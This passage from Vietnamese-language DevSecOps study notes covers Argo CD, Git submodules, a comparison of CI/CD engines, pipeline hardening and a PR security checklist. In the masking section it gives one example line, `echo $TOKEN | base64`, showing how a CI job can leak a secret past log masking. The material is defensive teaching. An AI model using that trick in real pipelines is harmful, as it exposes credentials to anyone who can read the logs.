| `spec.project` | AppProject (RBAC, ranh giới) | `default` cho phép mọi repo/cluster — nên tạo project riêng giới hạn `sourceRepos`, `destinations` |
| `source.repoURL` | Repo nguồn | Phải nằm trong whitelist của AppProject |
| `targetRevision` | Phiên bản theo dõi | `HEAD`/branch = theo dõi liên tục; pin SHA = bất biến |
| `destination.server` | Cluster đích | Giới hạn trong AppProject |
| `syncPolicy.automated.prune` | Xóa resource thừa | Bật cẩn thận — có thể xóa nhầm |
| `selfHeal` | Tự sửa drift | Ngăn thay đổi `kubectl edit` thủ công tồn tại |

### 7.5.4. Sync: manual, auto-sync, self-heal — khác biệt

- **Manual sync:** thấy OutOfSync nhưng **không** tự apply; người vận hành bấm "Sync".
- **Auto-sync (`automated`):** commit mới vào Git → tự apply trong vòng reconcile kế tiếp.
- **Self-heal:** khi ai đó `kubectl edit` resource (drift), Argo phát hiện live ≠ desired và **ghi đè về Git**. Đây là cơ chế phòng thủ chống thay đổi trái phép ở cluster: kẻ tấn công sửa Deployment để chèn sidecar độc hại → Argo tự revert trong vài phút.

### 7.5.5. App of Apps pattern

Một Application "root" trỏ tới thư mục chứa các manifest **Application khác**. Argo sync root → tạo các child App → mỗi child sync workload thật. Dùng để bootstrap toàn bộ cluster từ một Git repo.

```yaml
# root-app.yaml — quản lý các Application con
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: { name: root, namespace: argocd }
spec:
  project: default
  source:
    repoURL: https://github.com/my-org/gitops.git
    targetRevision: main
    path: bootstrap/apps          # thư mục chứa nhiều Application YAML
  destination: { server: https://kubernetes.default.svc, namespace: argocd }
  syncPolicy: { automated: { prune: true, selfHeal: true } }
```

**Bảo mật:** ai sửa được `bootstrap/apps` kiểm soát toàn bộ cluster. Repo GitOps phải có branch protection + required reviews nghiêm ngặt — nó tương đương quyền cluster-admin.

### 7.5.6. Lưu ý bảo mật Argo CD

- Argo CD chạy với quyền cao trong cluster (thường cluster-admin nếu quản nhiều namespace). Compromise Argo = compromise cluster.
- Khóa AppProject: giới hạn `sourceRepos`, `destinations`, `clusterResourceWhitelist`.
- Bảo vệ repo GitOps như production: signed commits, branch protection.
- Đổi mật khẩu `admin` mặc định (ban đầu = tên pod argocd-server), bật SSO/RBAC.
- Webhook nhận từ Git để sync ngay: xác thực webhook secret để tránh giả mạo trigger.

---

## 7.6. Git Submodule (chia sẻ template chung)

### 7.6.1. Là gì và cấu trúc trên đĩa

Submodule cho phép nhúng một repo Git (con) tại một đường dẫn trong repo cha, **pin theo một commit cụ thể**. Hai thành phần:

1. **`.gitmodules`** — file text ở gốc repo cha, ánh xạ path → URL:

```ini
[submodule "ci-templates"]
	path = ci-templates
	url = https://github.com/my-org/ci-templates.git
	branch = main
```

| Trường | Ý nghĩa | Ví dụ |
|---|---|---|
| `path` | Thư mục đặt submodule trong cha | `ci-templates` |
| `url` | Nguồn clone | `https://.../ci-templates.git` |
| `branch` | Branch theo dõi khi `--remote` | `main` (tùy chọn) |

2. **gitlink** — entry trong tree của repo cha tại `path`, không phải blob/tree thường mà là một con trỏ **commit SHA** (mode `160000`). Đây là cơ chế "pinning".

Xem bằng `git ls-tree`:

```
$ git ls-tree HEAD ci-templates
160000 commit 9b2c4f1a8d3e0c5b7f2a1d6e4c8b0a3f9d2e1c7b	ci-templates
```

`160000` là mode đặc biệt cho gitlink; theo sau là SHA commit (40 hex = 160 bit) của repo con được pin. Repo cha **không** lưu nội dung repo con, chỉ lưu con trỏ commit này.

### 7.6.2. Lệnh và luồng (từng bước)

```bash
# Thêm submodule
git submodule add https://github.com/my-org/ci-templates.git ci-templates
#  → tạo/cập nhật .gitmodules, clone repo con vào ci-templates/, stage gitlink

# Clone repo cha có submodule (submodule rỗng mặc định)
git clone https://github.com/my-org/app.git
git submodule init        # đọc .gitmodules → đăng ký vào .git/config
git submodule update      # clone/checkout submodule tại đúng commit pinned
# hoặc gộp:
git clone --recurse-submodules https://github.com/my-org/app.git

# Cập nhật submodule lên commit mới của branch theo dõi
git submodule update --remote ci-templates
git add ci-templates       # stage gitlink mới (con trỏ SHA mới)
git commit -m "Bump ci-templates"
```

**Luồng `git submodule update` từng bước:**
```
1. Đọc .git/config (path → url đã init)
2. Với mỗi submodule: đọc gitlink SHA từ index của cha
3. Vào thư mục con, fetch nếu thiếu commit đó
4. checkout chính xác commit SHA (detached HEAD) — KHÔNG theo branch
```
Mặc định submodule ở trạng thái **detached HEAD** tại đúng SHA pinned — đây là điểm hay gây nhầm lẫn: pull repo cha không tự cập nhật submodule trừ khi chạy `git submodule update`.

### 7.6.3. Vì sao dùng cho template chung & nhược điểm

**Vì sao dùng:** nhiều project (vd nhiều microservice) chia sẻ chung bộ template CI/CD, policy, script bảo mật. Đặt template vào một repo con, nhúng làm submodule:
- Mỗi project pin chính xác phiên bản template đã review (gitlink SHA) → **reproducible**, không bị template thay đổi đột ngột phá build.
- Nâng cấp template là một commit có chủ đích (đổi gitlink) → đi qua code review.

**Nhược điểm / cạm bẫy:**

| Nhược điểm | Chi tiết |
|---|---|
| Detached HEAD gây nhầm | Sửa trong submodule dễ mất nếu không commit/push đúng repo con |
| Hai bước cập nhật | Phải update submodule **và** commit gitlink ở cha — quên một bước = drift |
| Clone phức tạp | Người mới quên `--recurse-submodules` → thiếu file → build fail |
| Không atomic | Đổi repo con và repo cha là hai commit tách rời |

**So với lựa chọn khác:** Git **subtree** (gộp lịch sử repo con vào cha, không cần lệnh đặc biệt khi clone) hoặc package manager nội bộ (npm/pip private registry) hoặc cơ chế `include` của CI (GitLab `include: project:`). Với template CI, `include` từ một project trung tâm thường gọn hơn submodule.

### 7.6.4. Lưu ý bảo mật submodule

- **`url` trỏ tới repo do bên ngoài kiểm soát:** nếu attacker chiếm repo con, mọi cha kéo commit mới sẽ chạy code độc — nhưng vì pin theo SHA, chỉ bị ảnh hưởng khi ai đó chủ động bump. Pin SHA + review diff submodule.
- **`.gitmodules` injection (CVE lịch sử):** từng có lỗ hổng khi tên/path submodule chứa ký tự đặc biệt dẫn tới ghi file ngoài thư mục hoặc thực thi hook. Cập nhật Git mới; coi `.gitmodules` từ nguồn không tin cậy là dữ liệu nguy hiểm.
- Trong CI, `--recurse-submodules` kéo code bên thứ ba vào build — đối xử như dependency: scan, pin, kiểm soát URL.

---

## 7.7. So sánh và khi nào dùng công cụ nào

### 7.7.1. Bảng so sánh CI/CD engine

| Tiêu chí | GitLab CI | GitHub Actions | Jenkins |
|---|---|---|---|
| Cấu hình | `.gitlab-ci.yml` (YAML) | `.github/workflows/*.yml` (YAML) | `Jenkinsfile` (Groovy) |
| Tích hợp SCM | GitLab native | GitHub native | SCM-agnostic (plugin) |
| Hosting | SaaS + self-managed | SaaS + self-hosted runner | Self-hosted |
| Mô hình runner | Runner + executor | Runner (hosted/self) | Controller + agent |
| Hệ sinh thái tái dùng | `include` templates, CI components | Marketplace actions | Plugin (rất lớn, rủi ro) |
| Secrets | CI/CD variables (masked/protected) | Secrets + OIDC | Credentials store |
| Điểm mạnh | All-in-one DevSecOps (SAST/DAST tích hợp) | Hệ sinh thái action, OIDC mượt | Cực kỳ linh hoạt, on-prem lâu đời |
| Điểm yếu bảo mật | Runner privileged/shared | `pull_request_target`, script injection | Plugin CVE, Groovy sandbox bypass |

### 7.7.2. CI/CD push vs GitOps (Argo CD) — khi nào dùng

| Tình huống | Lựa chọn |
|---|---|
| Build/test/đóng gói artifact | CI engine (GitLab CI / Actions / Jenkins) |
| Triển khai vào Kubernetes, cần drift detection + audit qua Git | GitOps (Argo CD) |
| Triển khai non-K8s (VM, serverless, mobile) | CI-push (Actions/GitLab/Jenkins) |
| Cần credential cluster không rời cluster | GitOps |
| Mô hình lý tưởng hiện đại | CI build & push image → cập nhật manifest trong repo GitOps → Argo CD reconcile lên cluster |

**Mẫu kiến trúc kết hợp (khuyến nghị):**
```
[Code repo] --CI build/test/scan--> [Container Registry] (image @sha256:...)
     │
     └─ CI cập nhật tag image trong [GitOps repo] (commit)
                              │
                  Argo CD reconcile (pull)
                              ▼
                       [Kubernetes cluster]
```
Tách bạch: CI lo build & verify (không có quyền cluster), Argo lo deploy (không cần credential ra ngoài). Đây là phân tách trách nhiệm (SoD) tốt nhất cho DevSecOps.

### 7.7.3. Checklist bảo mật xuyên suốt chương

- Pin mọi thành phần bên thứ ba theo immutable digest/SHA (action, image `@sha256`, submodule gitlink).
- Least privilege token: GitLab `CI_JOB_TOKEN` scope hẹp, GHA `permissions` tối thiểu, OIDC `sub` pin chặt, Argo AppProject giới hạn repo/cluster.
- Branch protection + required review cho mọi repo chứa pipeline-as-code và GitOps manifest (chúng = thực thi mã đặc quyền).
- Cách ly runner/agent: không privileged, không docker.sock shared, ephemeral, không build trên controller.
- Secret hygiene: masked không phải kiểm soát đủ; không log secret, không nội suy secret vào lệnh shell qua interpolation engine.
- Phát hiện drift & self-heal (Argo) như một lớp phòng thủ chống thay đổi cluster trái phép.
- Quét SAST/SCA/secret-scan trong pipeline; chặn merge khi có finding nghiêm trọng.

---

## 7.8. Bảo vệ pipeline như một hệ thống production & tiêu chuẩn bảo mật cho PR

### 7.8.1. Pipeline là tài sản cần bảo vệ, không chỉ là công cụ

OWASP Top 10 2025 xếp "pipeline CI/CD bị chèn mã" vào nhóm **A08 — Software & Data Integrity Failures**: cập nhật không ký số, build bị can thiệp, deserialize dữ liệu không tin cậy. Với một công ty làm phần mềm cho khách hàng, hệ quả cụ thể hơn nhiều so với lý thuyết: **pipeline bị chiếm nghĩa là kẻ tấn công chèn mã vào đúng bản build giao cho khách** — mình trở thành mắt xích supply chain của họ, lỗ hổng của mình thành lỗ hổng của họ. Vì vậy pipeline phải được đối xử như hệ thống production, với checklist tối thiểu:

- **Secret trong CI để ở vault / secret manager, không in ra log.** Tiêm secret lúc chạy job (OIDC/workload identity nếu được — xem 7.3.4 và [Chương 6](#sec-06) mục 6.11), không gán cứng vào file pipeline hay biến plaintext. Nhớ rằng masking chỉ che log ở dạng nguyên văn (7.2.5) — một dòng `echo $TOKEN | base64` là lộ; quy tắc gốc vẫn là *không đưa secret ra stdout dưới bất kỳ dạng nào*.
- **Ký số + verify artifact.** Bản build/image phải được ký (cosign — [Chương 6](#sec-06) mục 6.10.4) và verify trước khi deploy; verify checksum và nguồn gốc của dependency kéo vào lúc build. Không có chữ ký thì "artifact đi qua stage được thăng cấp tin cậy" (7.1.2) chỉ là niềm tin suông.
- **Khóa quyền pipeline.** Ai sửa được file pipeline là thực thi được mã với đặc quyền của pipeline (7.1.3) — nên repo chứa pipeline-as-code cần branch protection + required review; token của job theo least privilege (7.7.3); quyền chỉnh sửa cấu hình CI/CD (variables, runner) giới hạn cho số ít người và có audit log.

### 7.8.2. PR security checklist & Definition of Done bảo mật

Gate tự động (SAST/SCA/secret scan — [Chương 6](#sec-06)) bắt lỗi generic, nhưng lỗi logic nghiệp vụ (thiếu check quyền, luồng tiền không idempotent) chỉ con người bắt được. Công cụ ở đây là **PR security checklist** — danh sách reviewer đối chiếu trước khi approve. Một bản áp dụng được cho backend có xử lý thanh toán và dữ liệu cá nhân:

- [ ] Mọi truy vấn tài nguyên ràng buộc chủ sở hữu lấy từ token — không tin id client gửi lên (chống IDOR).
- [ ] Không nối chuỗi SQL; dùng parameterized query / ORM.
- [ ] Input được validate (allowlist); output được encode đúng ngữ cảnh.
- [ ] Không hardcode secret; dùng secret manager; `.env` không lên repo.
- [ ] Endpoint mới có kiểm auth + phân quyền ở server.
- [ ] Thao tác liên quan tiền: atomic + idempotent, có kiểm số dư/điều kiện.
- [ ] Không log dữ liệu nhạy cảm (token, mật khẩu, số thẻ, định danh cá nhân).
- [ ] Lỗi xử lý fail-secure (mặc định từ chối); không lộ stack trace cho user.
- [ ] Nếu gọi LLM: tách role system/user; không cho gọi API nhạy cảm tự do; thao tác đổi trạng thái phải có xác nhận.
- [ ] Dependency mới đã được quét, không CVE nghiêm trọng.

Nguyên tắc thiết kế checklist: **phải đủ ngắn để dev thực sự đọc** — checklist 30 mục là checklist không ai đọc. Mỗi mục phải kiểm được bằng mắt trên diff, không phải mục "hãy bảo mật tốt".

Bổ sung cho checklist là **Definition of Done có bảo mật** — một tính năng chỉ "done" khi:

1. Đã viết ít nhất một abuse case ("kẻ xấu lạm dụng tính năng này thế nào?") và xử lý nó.
2. Qua SAST + secret scan trong CI, không còn lỗi Critical/High.
3. Luồng nhạy cảm (auth / payment / dữ liệu cá nhân) có human review — không phụ thuộc hoàn toàn scanner hay AI review.
4. Có log sự kiện bảo mật cần thiết, và log không lộ dữ liệu nhạy cảm.

Điểm khác biệt so với DoD thường: "chạy được" chưa đủ — phải "chạy được và không mở lỗ hổng mới". Đưa tiêu chí bảo mật vào DoD nghĩa là bảo mật nằm trong định nghĩa hoàn thành từ đầu, rẻ và tự nhiên hơn nhiều so với kiểm sau khi xong.

---

## Ghi chú của mình

> *Khu vực ghi chú cá nhân: những điểm từng hiểu sai, phần còn đang tìm hiểu, hoặc kinh nghiệm rút ra khi thực hành — cập nhật dần.*

- Là người làm bảo mật duy nhất ở công ty nhỏ, mình học được rằng pipeline chính là "người gác cổng thay mình": gate và scan chạy tự động không cần mình online, và đó là điều kiện để hệ thống vẫn "an toàn mặc định" khi người duy nhất nghỉ phép. Nếu quy trình bảo mật nào cũng cần mình bấm nút thì mình là single point of failure — automation trong chương này (gate, protected branch, OIDC thay secret tĩnh) là cách gỡ điểm nghẽn đó.
- Điều từng hiểu sai: nghĩ masked variable là "đã an toàn". Thực tế masking chỉ che log dạng nguyên văn — job in secret qua một phép biến đổi là lộ, và MR độc hại trên nhánh không protected vẫn đọc được biến nếu quên set protected cả hai phía (biến VÀ branch). Từ đó mình coi cặp cấu hình protected variable + protected branch là thứ phải kiểm tra cùng nhau, không tách rời.
- Bài học về gate ở tầng PR: gate quá gắt thì dev bypass — không phải vì họ vô trách nhiệm, mà vì deadline là thật. Giải pháp không phải nới gate mà là có **đường exception chính thức** (approve + ticket + audit, xem [Chương 6](#sec-06) mục 6.9.4); khi có đường đi đàng hoàng lúc gấp, người ta không đục tường nữa. Và checklist PR mình cố tình giữ ngắn — thà 10 mục được đọc thật còn hơn 30 mục bị approve theo quán tính.
- Đang tìm hiểu tiếp: GitOps/Argo CD mình mới nắm ở mức khái niệm và lab, chưa vận hành thật (hệ thống hiện tại deploy theo mô hình CI-push truyền thống lên VM); thứ mình muốn thử trước là tách quyền deploy khỏi CI theo đúng tinh thần 7.7.2, kể cả khi chưa có Kubernetes.
